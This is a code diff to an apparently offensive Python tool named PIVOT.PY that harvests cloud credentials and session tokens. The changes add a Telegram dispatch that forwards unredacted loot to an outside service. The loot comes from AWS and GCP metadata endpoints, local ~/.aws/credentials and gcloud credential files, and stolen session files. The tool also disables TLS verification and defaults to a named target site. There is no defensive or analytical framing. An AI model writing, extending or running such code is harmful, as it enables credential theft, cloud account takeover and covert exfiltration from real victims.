@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-PIVOT.PY — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine
+PIVOT.PY — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine v8.0 (With Telegram Telemetry)
 Features:
 - Live AWS & GCP credential and token retrieval
 - Compromised session file & cookie extraction
 - Covert data encoding & exfiltration preparation
 - TLS verification bypass
 - Live on-screen terminal streaming & zero-disk memory architecture
+- Real-time asynchronous Telegram notification dispatch for unredacted pivot loot
 """
 import asyncio
 import socket
@@ -21,6 +22,9 @@ import urllib.parse
 from urllib.parse import urlsplit
 import sys
 
+# Import centralized Telegram broadcaster
+from modules.telegram_notifier import send_telegram_alert
+
 # ============================================================
 # CONFIGURATION & OFFENSIVE PAYLOADS
 # ============================================================
@@ -31,7 +35,7 @@ SSL_CONTEXT.check_hostname = False
 SSL_CONTEXT.verify_mode = ssl.CERT_NONE
 
 # ============================================================
-# TERMINAL OUTPUT
+# TERMINAL OUTPUT & TELEGRAM DISPATCHER
 # ============================================================
 class Colors:
     RED = "\033[91m"
@@ -46,6 +50,17 @@ class Colors:
 def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous pivot functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 # ============================================================
 # TARGET NORMALIZATION
@@ -95,7 +110,6 @@ class AutonomousPivotEngine:
         )
         retrieved_creds = []
         
-        # AWS & GCP Metadata Endpoints
         metadata_urls = [
             "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
@@ -111,11 +125,16 @@ class AutonomousPivotEngine:
                     if data:
                         log(f"\n\033[1m\033[91m[***] CLOUD CREDENTIALS HARVESTED [{url}] [***]\033[0m", Colors.RED)
                         log(f"  └── Payload : {data[:250]}", Colors.GREEN)
-                        retrieved_creds.append({"endpoint": url, "data": data[:250]})
+                        
+                        loot_payload = {"endpoint": url, "data": data[:400]}
+                        retrieved_creds.append(loot_payload)
+
+                        # BROADCAST UNREDACTED CLOUD CREDENTIALS STRAIGHT TO TELEGRAM
+                        broadcast_tg_alert_sync("Cloud Credentials Harvested", loot_payload)
+
             except Exception as err:
                 log(f"[-] Endpoint unreachable / blocked: {url} ({err})", Colors.GRAY)
 
-        # Also search common local credential file locations if readable
         local_paths = [
             os.path.expanduser("~/.aws/credentials"),
             os.path.expanduser("~/.config/gcloud/credentials.db")
@@ -127,7 +146,12 @@ class AutonomousPivotEngine:
                         content = f.read(1024)
                         log(f"\n[***] LOCAL CONFIG CREDENTIAL FOUND [{path}] [***]", Colors.RED)
                         log(f"  └── Content : {content[:150]}", Colors.GREEN)
-                        retrieved_creds.append({"path": path, "content": content[:150]})
+                        
+                        loot_payload = {"path": path, "content": content[:300]}
+                        retrieved_creds.append(loot_payload)
+
+                        # BROADCAST UNREDACTED LOCAL CONFIG LOOT STRAIGHT TO TELEGRAM
+                        broadcast_tg_alert_sync("Local Config Credential Found", loot_payload)
                 except Exception:
                     pass
 
@@ -166,6 +190,9 @@ class AutonomousPivotEngine:
 
         for sess in extracted_sessions:
             log(f"  └── Extracted Session Token: {str(sess)[:100]}", Colors.GREEN)
+            
+            # BROADCAST UNREDACTED SESSION TOKEN STRAIGHT TO TELEGRAM
+            broadcast_tg_alert_sync("Compromised Session Extracted", {"session": str(sess)[:400]})
 
         return {
             "extracted": True,
@@ -291,22 +318,14 @@ class AutonomousPivotEngine:
             Colors.CYAN,
         )
 
-        # 1. DNS Resolution
         dns_results = await asyncio.to_thread(self.inspect_dns)
-        
-        # 2. TLS Inspection with Bypass
         tls_results = await asyncio.to_thread(self.inspect_tls)
-        
-        # 3. AWS / GCP Credential Harvesting
         cloud_creds = await asyncio.to_thread(self.harvest_cloud_metadata)
-        
-        # 4. Compromised Session Extraction
         session_results = await asyncio.to_thread(
             self.extract_compromised_sessions,
             compromised_session_path
         )
         
-        # 5. Covert Exfiltration Preparation
         exfil_data = {
             "target": self.target_host,
             "credentials": cloud_creds,
@@ -363,3 +382,7 @@ async def run_pivot_engine(target_host, options=None):
             "error": str(error),
             "files_written": False,
         }
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
+    asyncio.run(run_pivot_engine(target))
